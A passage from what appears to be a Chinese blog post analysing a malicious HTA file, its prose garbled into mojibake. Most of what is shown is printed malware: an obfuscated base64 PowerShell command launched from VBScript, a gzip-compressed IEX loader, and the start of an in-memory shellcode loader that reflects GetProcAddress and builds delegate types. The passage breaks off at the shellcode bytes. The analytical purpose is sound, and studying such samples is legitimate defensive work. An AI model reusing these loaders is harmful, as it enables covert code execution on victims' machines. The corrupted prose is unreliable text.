TwBJAHoAcQBTAHgAaQBFAHQAZABzADUARAB3ADYAbwBrAG0AQwBSAGkAdgBzAEsASQBkAEYASwBMAHAAcQBTAHgARQBXAGcANgBFAHQAUABjADkAZgBoADYAMwBSAEIAQwAvAEUAUwBrADIAZABqAHYAMwArAHEASwB5AG8AYwBsAHcAZQBpAFQARQBUAFIAMQBKAHQATgBMAEIASgBkAHoAQgArAGIATABWAEUATABjAEkAdAAzAHgARQBQAG8AUwBZAGQAegBDAGEAQgBmAEEAegBMAGgALwBGAFkAMQBCAGkASgAxAFcAbAB6AHEATQB4AEYAZwBRAHoAMQBWADUATABhAHkAMgB5ADAAUgBGAFUAegBwAGcAdABCAHIATgBUADMAZQBLAEEATwBtADAATgBWAGsAegBmAHEAVwBCAG8ATwB1AGoAMwByAGQAUwBzADcAYwBRAFAASABpACsAMwBjADEAYQBxAHkAOABIAGkAawBzADMAQQBxAHgAKwB5ADQASABuAGoAagBlAFUAdgBzAHkAcwBDAGIAaABlAE8AYgBjADEAZAA2AHgAbQAxAGkARwBWAE4AaQA0AFMAbAArAG4AagB1ADMAQQBuAEkAbgBPAHoAeABiAHgARQAyAFgATwBMAGkATgBuAHgAZABUAGYANwA4AHcAbABUAGEASwBOADAARgBEAC8ALwAvAGoATgA2ADkAMABqAHIAUgBPAC8AcwBDAEMAZgBTADkAdgBjAEEAOABMADUAYQA3AGMAcQBwAHQAZwBuADkAWQByAGkAOQAyADgAMQBUAGsAMAAzAGIAbwBBAHYAcgBwAHoAVgAzAGEAYgBUAG8AZQBSAGkAbgArAEwAWABMAG0AQwB4AFoAcQB3AGcATABXAG0ATQA5AGsAWgBsAFgAbQBqAFgAZwBrAFYARgBBAE0AZQBsAHQAWQByADEAMQBDAGQAQQBFAC8AMQBxAGQAWgBUAGoAcwBEAG4AYwByAGgAVgBLAHUAcQBXAFMATwB4ACsASQB6AFIAYgB3AE0AUABZAEEAYgA0AEEAagA2AHcAdgBiAGkAZgBlAGgAYwBEAFQAUgBHADAAcQBpAFoAWgB5ADkAYwBCAFEAVQBNACsANABlAHIAdQAyAGQANAAyAEIAVgBlADAAYQAyADAAbQA0AHUASwArAHEAVQBWAGQAZwBSAHkAeAB0AFYAQgAxAHkATgBaAEEARwA1AFMASABrAFEAWgBPAEcAMABqAGkAdABEAC8AQQA4AHAAUgBWAHAANwBRAFgAUQBZAHgAegBTAGUALwBzAGYASABQAHoAZgAyAEkAeAA3AHEAegBsAFEAYQBhAEMASQBwAGYATgBmAHYAdgBEAHAAMwBmACsAMgBzAHIAdwArAHIAQwA2ADkAMgB0AHYANwBqAFgARQBBAGEAMABJAHQAcgBWAC8AWgB5AGgANgA5AHEAMQBxAGYATgBVAEEAcQBDAHMASQBOAHMAcQBHAGEAUQBSAE4AegB1AFkASgBrAEwANQBEAFAAcgBVAGoAZgBzADEASwBOAFEAdQBIAGoANwB2AG0AVgBCAGkANgAxAG8AYgBPAEUAMwB2AE4AUwB1AEUAWABiADkAbgBEAGEAUABIADMAUwB4AFUAQQByAGQAMgBxAHcAVgBuAEIAQgBqAFcARQBvAFYARAA0AGMAOABkAHkAYgBJAEgAUgBNAHAANQBpAE0AYQBMADMATwBHAG8AeAB6AGgASgBjACsANgB5AEwANAA5AGUAcwBDAHcAaQB1ACsAQQA3AEYASABYAFoATgB0AGkAbAB6ADUASQBKAFQATAA1AGYAUwAvAFcAdQBaAHoAdgB3ADkATAB3AC8ATwBUAHcAcAB1ADUAWQB0AHAAZwB2AGYAUABrAC8AVQA1ADIAdABoAE4ALwBSAGoAKwBJAFgASQBmACsARAB4AFAAdwAwADYAYgAvAEcAZABvAFUAdgBLAHgASABlADQATQB1AGMAKwBoAGoAdgBQAGgAYwAvAGwAcwB1AHAANgB5ADUAZAAvAE8AaABkAFkAUQB2AEUATAByAGoASABqAEwAdQBoAFUAQgAxAGQAcgBQADEARABQAGgAYwB5AGUANwBmAHcAagBYAGkATwBVAFcAYQBjAGQAZQBJACsAOABIAGQAUQBIAGgAaQBLAEYAVABnAG0AeQBVAHcAbwAvAFEAeQA1AGsANgBmAFkATgArADUARwBGAGsAbgB4AGUALwBjAGsARwBJAEsATABmAFIATgB4AHoATwBBAHAAUgBSADYAcQB0AFIAMABaAGkAUQBWAGgAcgBsAC8AQQB1ADcARABCAGoAUABUAEQAUQBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>var_func<br>self.close<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ¥çœ‹htaçš„æºç ï¼Œä½¿ç”¨VBSå†™çš„ï¼Œæ˜¯ä¸€ç§å¾®è½¯ç¯å¢ƒä¸‹çš„è½»é‡çº§çš„è§£é‡Šå‹è¯­è¨€ï¼ŒåŒæ—¶å®ƒåˆæ˜¯aspåŠ¨æ€ç½‘é¡µé»˜è®¤çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½†è¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼Œå…¶ä¸­æœ€ä»¤æˆ‘ä»¬å…³æ³¨çš„æ˜¯å†™å…¥shellå‘½ä»¤ä¸­çš„è¿™ä¸€é•¿çŸ­base64ç¼–ç çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å…ˆè§£ç çœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://s2.loli.net/2022/08/16/4PVe1bmfKvyXRoF.png" alt="base64è§£ç "></p><p>è§£ç å®Œäº†ä¹‹åæ˜¯è¿™ä¸€æ®µï¼ŒæŠŠ<code>.</code>æ›¿æ¢æ‰ï¼Œå¾—åˆ°è¿™ä¸€æ®µä»£ç </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IOMemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IOStreamReader(<span class="hljs-built_in">New-Object</span> IOCompressionGzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IOCompressionCompressionMode</span>]::Decompress)))ReadToEnd();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜æ˜¯å…ˆæŠŠä¸­é—´çš„ä¸€é•¿ä¸²æ‹¿å»base64è§£å¯†ï¼Œä½†ç»“æœæ˜¯ä¸€å †ä¹±ç ï¼Œå¯æƒœ<br>é‚£æˆ‘ä»¬æ¥çœ‹çœ‹å…¶ä»–çš„<br>å…¶ä¸­æœ‰è¿™å‡ ä¸ªå‡½æ•°æ¯”è¾ƒå€¼å¾—å…³æ³¨</p><blockquote><p><code>IOMemoryStream(,[Convert]::FromBase64String())</code>å°†å­—ç¬¦ä¸²base64ç¼–ç åï¼Œå­˜å…¥åˆ°æµä¸­<br><code>IOCompressionGzipStream()</code>ä½¿ç”¨Gzipå‹ç¼©<br>æœ€åé€šè¿‡Invoke-Expressionï¼ˆè¿è¡Œä¸€ä¸ªä»¥å­—ç¬¦ä¸²å½¢å¼æä¾›çš„ Windows PowerShell è¡¨è¾¾å¼ï¼‰å°†å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ç½‘ä¸Šæœ‰ç°æˆçš„è„šæœ¬ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿å»è·‘è¯•ä¸€ä¸‹<a href="http://chernodv.blogspot.com.cy/2014/12/powershell-compression-decompression.html">è„šæœ¬åŸæ–‡é“¾æ¥</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;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&#x27;</span>)<br><span class="hljs-variable">$ms</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream<br><span class="hljs-variable">$ms</span>.Write(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$data</span>.Length)<br><span class="hljs-variable">$ms</span>.Seek(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$sr</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$ms</span>, [<span class="hljs-type">System.IO.Compression.CompressionMode</span>]::Decompress))<br><span class="hljs-variable">$sr</span>.ReadToEnd() | <span class="hljs-built_in">set-clipboard</span><br></code></pre></td></tr></table></figure><p>è¯¥è„šæœ¬é¦–å…ˆç»è¿‡base64è§£ç ï¼Œç„¶åå†è¿›è¡Œgzipè§£å‹ï¼Œæ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çœ‹åˆ°çš„htaçš„æºç </p><blockquote><p>è¿™é‡Œæˆ‘çŠ¯äº†ä¸€ä¸ªä½çº§é”™è¯¯ï¼Œåœ¨ä¹‹å‰base64è§£ç å‡ºæ¥çš„ç»“æœé‡Œé¢ï¼ŒæŠŠå¤šä½™çš„<code>.</code>éƒ½æ›¿æ¢æ‰äº†ï¼ŒåŒæ—¶ä¹Ÿå°†ä»£ç ä¸­åŸæœ¬çš„<code>.</code>ä¹Ÿå»æ‰äº†ï¼Œæ•…æ­£ç¡®çš„ä»£ç åº”è¯¥é•¿è¿™æ ·<br>å½“æ—¶ä¹Ÿæƒ³åˆ°è¿™ä¸ªé—®é¢˜äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥æ²¡æœ‰æ³¨æ„ï¼ŒæŒºæ€ªçš„</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IO.MemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IO.StreamReader(<span class="hljs-built_in">New-Object</span> IO.Compression.GzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();<br></code></pre></td></tr></table></figure><p>ç»“æœä¼šè‡ªåŠ¨ä¿å­˜åœ¨å‰ªè´´æ¿é‡Œ<br>å¾—åˆ°è§£å‹åçš„æºç </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = 